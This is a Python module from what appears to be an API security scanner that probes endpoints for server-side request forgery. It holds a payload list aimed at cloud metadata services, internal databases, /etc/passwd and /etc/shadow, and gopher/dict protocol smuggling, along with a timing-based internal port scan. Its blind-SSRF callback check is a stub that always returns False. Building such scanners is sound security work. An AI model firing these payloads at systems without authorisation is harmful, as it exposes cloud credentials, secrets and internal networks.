"""SSRF and Callback Testing Module for OverApi."""

import logging
import asyncio
import socket
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional, List, Dict, Any
import requests


class SSRFVulnerabilityType(Enum):
    """SSRF vulnerability types."""
    WEBHOOK_INJECTION = "webhook_injection"
    CALLBACK_INJECTION = "callback_injection"
    METADATA_ACCESS = "metadata_access"
    INTERNAL_PORT_SCAN = "internal_port_scan"
    BLIND_SSRF = "blind_ssrf"
    PROTOCOL_SMUGGLING = "protocol_smuggling"
    DNS_REBINDING = "dns_rebinding"
    FILE_ACCESS = "file_access"


@dataclass
class SSRFVulnerability:
    """SSRF vulnerability finding."""
    vuln_type: SSRFVulnerabilityType
    severity: str
    title: str
    description: str
    evidence: Dict[str, Any] = field(default_factory=dict)
    remediation: str = ""
    cvss_score: float = 0.0
    cwe_id: str = ""
    owasp_category: str = ""
    endpoint: str = ""
    parameter: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            'type': self.vuln_type.value,
            'severity': self.severity,
            'title': self.title,
            'description': self.description,
            'evidence': self.evidence,
            'remediation': self.remediation,
            'cvss_score': self.cvss_score,
            'cwe_id': self.cwe_id,
            'owasp_category': self.owasp_category,
            'endpoint': self.endpoint,
            'parameter': self.parameter,
        }


class SSRFTester:
    """Advanced SSRF vulnerability tester."""

    WEBHOOK_PARAMETERS = [
        'callback_url', 'webhook_url', 'redirect_uri', 'return_url',
        'image_url', 'avatar_url', 'profile_pic', 'import_url',
        'source_url', 'file_url', 'url', 'link', 'uri', 'endpoint'
    ]

    # SSRF payloads targeting cloud metadata and internal services
    SSRF_PAYLOADS = [
        # AWS metadata
        ('http://169.254.169.254/latest/meta-data/', 'AWS Metadata'),
        ('http://169.254.169.254/latest/user-data/', 'AWS User Data'),
        ('http://169.254.169.254/latest/api/token', 'AWS API Token'),

        # GCP metadata
        ('http://metadata.google.internal/computeMetadata/v1/', 'GCP Metadata'),
        ('http://169.254.169.254/computeMetadata/v1/', 'GCP Metadata Alt'),

        # Azure metadata
        ('http://169.254.169.254/metadata/instance', 'Azure Metadata'),

        # Internal services - Database
        ('http://localhost:3306/', 'MySQL'),
        ('http://127.0.0.1:3306/', 'MySQL localhost'),
        ('http://localhost:5432/', 'PostgreSQL'),
        ('http://localhost:27017/', 'MongoDB'),

        # Internal services - Cache
        ('http://localhost:6379/', 'Redis'),
        ('http://localhost:11211/', 'Memcached'),

        # Internal services - Search
        ('http://localhost:9200/', 'Elasticsearch'),
        ('http://localhost:8086/', 'InfluxDB'),

        # Internal services - Container/Orchestration
        ('http://localhost:2375/', 'Docker API'),
        ('http://localhost:8080/actuator', 'Spring Actuator'),

        # Internal services - Admin panels
        ('http://localhost:8080/manager/html', 'Tomcat Manager'),
        ('http://localhost:8000/admin', 'Admin Panel'),

        # File access
        ('file:///etc/passwd', 'File - Unix passwd'),
        ('file:///etc/shadow', 'File - Unix shadow'),
        ('file:///windows/win.ini', 'File - Windows'),

        # Protocol smuggling
        ('dict://localhost:11211/stats', 'Memcached stats'),
        ('gopher://localhost:6379/_INFO', 'Redis info'),
    ]

    def __init__(self, target_url: str, collaborator_url: str = None,
                 headers: Dict[str, str] = None, proxies: Dict[str, str] = None,
                 timeout: int = 30):
        """
        Initialize SSRF Tester.

        Args:
            target_url: Target API URL
            collaborator_url: Out-of-band callback URL (Burp Collaborator, etc)
            headers: Custom HTTP headers
            proxies: Proxy configuration
            timeout: Request timeout
        """
        self.target_url = target_url
        self.collaborator_url = collaborator_url
        self.headers = headers or {}
        self.proxies = proxies
        self.timeout = timeout
        self.logger = logging.getLogger(__name__)
        self.vulnerabilities: List[SSRFVulnerability] = []
        self.session = requests.Session()
        if proxies:
            self.session.proxies.update(proxies)

    async def test(self, test_endpoints: List[Dict[str, Any]] = None) -> List[SSRFVulnerability]:
        """
        Execute SSRF tests on endpoints.

        Args:
            test_endpoints: Endpoints to test

        Returns:
            List of vulnerabilities found
        """
        self.logger.info("Starting SSRF testing...")

        if not test_endpoints:
            test_endpoints = self._get_default_test_endpoints()

        # Run tests
        tests = [
            self.test_webhook_injection(test_endpoints),
            self.test_blind_ssrf(test_endpoints),
            self.test_internal_port_scan(test_endpoints),
        ]

        results = await asyncio.gather(*tests, return_exceptions=True)

        for result in results:
            if isinstance(result, list):
                self.vulnerabilities.extend(result)
            elif isinstance(result, SSRFVulnerability):
                self.vulnerabilities.append(result)

        self.logger.info(f"Found {len(self.vulnerabilities)} SSRF vulnerabilities")
        return self.vulnerabilities

    async def test_webhook_injection(self, test_endpoints: List[Dict[str, Any]]) -> List[SSRFVulnerability]:
        """
        Test for webhook URL injection vulnerabilities.

        Attempts to make server fetch from malicious URLs.
        """
        vulnerabilities = []

        try:
            for endpoint in test_endpoints[:10]:
                # Look for webhook-related endpoints
                path = endpoint.get('path', '').lower()

                if any(keyword in path for keyword in ['webhook', 'callback', 'redirect', 'import']):
                    # Test each SSRF payload
                    for payload, payload_name in self.SSRF_PAYLOADS[:10]:  # Limit to first 10
                        vuln = await self._test_webhook_endpoint(
                            endpoint, payload, payload_name
                        )

                        if vuln:
                            vulnerabilities.append(vuln)
                            break  # Stop after first successful payload

        except Exception as e:
            self.logger.error(f"Webhook injection test error: {str(e)}")

        return vulnerabilities

    async def _test_webhook_endpoint(self, endpoint: Dict[str, Any],
                                    payload: str, payload_name: str) -> Optional[SSRFVulnerability]:
        """Test specific webhook endpoint with payload."""
        try:
            path = endpoint.get('path', '')
            method = endpoint.get('method', 'POST').upper()

            # Try common webhook parameters
            for param in self.WEBHOOK_PARAMETERS:
                url = f"{self.target_url}{path}".rstrip('/')

                if method == 'GET':
                    test_url = f"{url}?{param}={payload}"
                    response = self.session.get(test_url, headers=self.headers, timeout=self.timeout)
                else:
                    test_data = {param: payload}
                    response = self.session.request(
                        method=method,
                        url=url,
                        json=test_data,
                        headers=self.headers,
                        timeout=self.timeout,
                    )

                # Check for indicators of successful SSRF
                if response.status_code in [200, 201]:
                    # Look for metadata/service responses in body
                    response_text = response.text.lower()

                    if any(indicator in response_text for indicator in [
                        'ami-id', 'availability-zone', 'instance-type',
                        'redis', 'mysql', 'postgres', 'mongodb',
                        'elasticsearch', 'secret', 'password', 'token',
                        'aws', 'gcp', 'azure'
                    ]):
                        return SSRFVulnerability(
                            vuln_type=SSRFVulnerabilityType.WEBHOOK_INJECTION,
                            severity="critical",
                            title="SSRF via Webhook Parameter",
                            description=f"Endpoint {path} vulnerable to SSRF via {param} parameter",
                            evidence={
                                'endpoint': path,
                                'parameter': param,
                                'payload_type': payload_name,
                                'response_status': response.status_code,
                                'response_sample': response.text[:200],
                            },
                            remediation="Validate URLs against whitelist. Disable redirects. Use allowlist of domains.",
                            cvss_score=8.6,
                            cwe_id="CWE-918",
                            owasp_category="API10:2023 Unsafe Consumption of APIs",
                            endpoint=path,
                            parameter=param,
                        )

        except Exception as e:
            self.logger.debug(f"Webhook endpoint test error: {str(e)}")

        return None

    async def test_blind_ssrf(self, test_endpoints: List[Dict[str, Any]]) -> List[SSRFVulnerability]:
        """
        Test for blind SSRF via out-of-band callback.

        Uses collaborator-like service to detect blind SSRF.
        """
        vulnerabilities = []

        if not self.collaborator_url:
            self.logger.warning("No collaborator URL configured for blind SSRF testing")
            return vulnerabilities

        try:
            for endpoint in test_endpoints[:5]:
                path = endpoint.get('path', '')
                method = endpoint.get('method', 'POST').upper()

                # Generate unique callback URL
                callback_url = f"http://{self.collaborator_url}/ssrf-test-{int(time.time())}"

                for param in self.WEBHOOK_PARAMETERS:
                    url = f"{self.target_url}{path}".rstrip('/')

                    test_data = {param: callback_url}

                    try:
                        response = self.session.request(
                            method=method,
                            url=url,
                            json=test_data,
                            headers=self.headers,
                            timeout=self.timeout,
                        )

                        # Check collaborator for callback
                        await asyncio.sleep(0.5)

                        if self._check_collaborator_callback(callback_url):
                            vulnerabilities.append(SSRFVulnerability(
                                vuln_type=SSRFVulnerabilityType.BLIND_SSRF,
                                severity="high",
                                title="Blind SSRF Vulnerability",
                                description=f"Endpoint {path} makes out-of-band HTTP request to attacker server",
                                evidence={
                                    'endpoint': path,
                                    'parameter': param,
                                    'callback_received': True,
                                    'response_status': response.status_code,
                                },
                                remediation="Disable URL fetching if not required. Validate URLs. Use allowlists.",
                                cvss_score=7.5,
                                cwe_id="CWE-918",
                                owasp_category="API10:2023 Unsafe Consumption of APIs",
                                endpoint=path,
                                parameter=param,
                            ))

                    except requests.Timeout:
                        pass
                    except Exception:
                        pass

        except Exception as e:
            self.logger.error(f"Blind SSRF test error: {str(e)}")

        return vulnerabilities

    async def test_internal_port_scan(self, test_endpoints: List[Dict[str, Any]]) -> List[SSRFVulnerability]:
        """
        Perform port scanning via SSRF.

        Uses timing attacks to detect open ports on internal network.
        """
        vulnerabilities = []

        try:
            webhook_endpoints = [
                e for e in test_endpoints
                if any(keyword in e.get('path', '').lower()
                       for keyword in ['webhook', 'callback', 'redirect'])
            ]

            for endpoint in webhook_endpoints[:3]:
                path = endpoint.get('path', '')
                method = endpoint.get('method', 'POST').upper()

                # Scan common internal IPs and ports
                scan_targets = [
                    ('localhost', [22, 23, 80, 443, 3306, 5432, 6379, 8080, 8443]),
                    ('127.0.0.1', [3306, 5432, 6379, 27017, 9200]),
                ]

                for host, ports in scan_targets:
                    for port in ports:
                        payload = f"http://{host}:{port}/"

                        url = f"{self.target_url}{path}".rstrip('/')

                        start_time = time.time()
                        try:
                            response = self.session.request(
                                method=method,
                                url=url,
                                json={'callback_url': payload},
                                headers=self.headers,
                                timeout=self.timeout,
                            )
                            elapsed = time.time() - start_time

                            # Open ports typically respond faster
                            if elapsed < 0.5 and response.status_code == 200:
                                vulnerabilities.append(SSRFVulnerability(
                                    vuln_type=SSRFVulnerabilityType.INTERNAL_PORT_SCAN,
                                    severity="high",
                                    title="Internal Port Scan via SSRF",
                                    description=f"Can scan internal ports on {host}:{port}",
                                    evidence={
                                        'target_host': host,
                                        'target_port': port,
                                        'response_time': elapsed,
                                        'likely_open': elapsed < 0.5,
                                    },
                                    remediation="Disable SSRF capability. Use firewall rules. Restrict outbound connections.",
                                    cvss_score=7.5,
                                    cwe_id="CWE-918",
                                    endpoint=path,
                                ))

                        except requests.Timeout:
                            pass
                        except Exception:
                            pass

        except Exception as e:
            self.logger.error(f"Internal port scan error: {str(e)}")

        return vulnerabilities

    def _check_collaborator_callback(self, callback_url: str) -> bool:
        """
        Check if callback was received on collaborator.

        This would integrate with actual Burp Collaborator or similar service.
        """
        # In real implementation, would check collaborator API
        # For now, return False
        return False

    def _get_default_test_endpoints(self) -> List[Dict[str, Any]]:
        """Get default endpoints to test."""
        return [
            {'path': '/api/webhook/create', 'method': 'POST'},
            {'path': '/api/callback', 'method': 'POST'},
            {'path': '/api/import', 'method': 'POST'},
            {'path': '/api/fetch', 'method': 'POST'},
            {'path': '/api/download', 'method': 'POST'},
        ]
